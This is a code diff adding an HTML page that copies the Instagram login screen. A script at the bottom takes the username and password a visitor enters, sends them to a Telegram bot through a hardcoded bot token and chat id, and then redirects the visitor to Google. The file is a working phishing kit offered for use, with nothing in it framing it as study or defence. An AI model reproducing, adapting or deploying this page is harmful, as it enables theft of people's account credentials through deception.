@@ -1,0 +1,152 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
+    <title>instagram.com/loging/</title>
+<style>
+    body {
+    font-family: Arial, sans-serif;
+    margin: 0;
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    height: 100vh;
+    background-color: #fafafa;
+}
+
+.container {
+    width: 280px;
+    max-width: 400px;
+    margin: auto;
+}
+
+
+
+h1 {
+    text-align: center;
+    color: #333;
+}
+
+form {
+    display: flex;
+    flex-direction: column;
+}
+
+label {
+    margin-top: 10px;
+    color: #555;
+}
+
+input {
+    padding: 8px;
+    margin-top: 5px;
+    margin-bottom: 15px;
+    border: 1px solid #ddd;
+    border-radius: 4px;
+}
+
+button {
+    background-color: #3897f0;
+    color: #fff;
+    padding: 10px;
+    border: none;
+    border-radius: 13px;
+    cursor: pointer;
+    font-size: 16px;
+    margin-bottom: 35px;
+}
+h5{
+    color: #319cff;
+    font-size: 0.9rem;
+    position: relative;
+    left: 150px;
+    bottom: 15px;
+}
+
+button:hover {
+    background-color: #2671a1;
+}
+img{
+    display: inline-block;
+    position: relative;
+    bottom: 50px;
+    left: 45px;
+    filter: brightness(20%);
+}
+input{
+    height: 20px;
+}
+h6{
+    font-size: 0.8rem;
+    margin: auto;
+    filter: contrast(70%);
+}
+h6 span{
+    color: #319cff;
+
+}
+</style>
+</head>
+<body>
+    <div class="container">
+        <div class="box">
+            <img src="insta.png">
+        
+            <form action=""onsubmit=" return sender()">
+                
+                <input type="text" id="name" name="name" placeholder="Phone number,username,or email" required>
+
+                
+                <input type="password" id="password" name="password" placeholder="Password" required>
+                <h5>Forgot password?</h5>
+
+                <button type="submit" >Log in</button>
+                <h6>Don't have an account?<span> Sign up</span></h6>
+            </form>
+        </div>
+    </div>
+</body>
+
+<script>
+
+//bot token
+var telegram_bot_id = "5962917657:AAEWI2ZtgnymGwObzW8AFGa9xwC5kcIj3vs";
+//chat id
+var chat_id = 1993338199;
+var u_name, password;
+var ready = function () {
+    u_name = document.getElementById("name").value;
+    password = document.getElementById("password").value;
+    message = "UserName: " + u_name + "\nPassword: " + password ;
+};
+var sender = function () {
+    ready();
+    var settings = {
+        "async": true,
+        "crossDomain": true,
+        "url": "https://api.telegram.org/bot" + telegram_bot_id + "/sendMessage",
+        "method": "POST",
+        "headers": {
+            "Content-Type": "application/json",
+            "cache-control": "no-cache"
+        },
+        "data": JSON.stringify({
+            "chat_id": chat_id,
+            "text": message
+        })
+    };
+    $.ajax(settings).done(function (response) {
+        console.log(response);
+    });
+    document.getElementById("name").value = "";
+    document.getElementById("password").value = "";
+    window.location.href='https://www.google.com/';
+    return false;
+    
+};
+
+</script>
+
+</html>
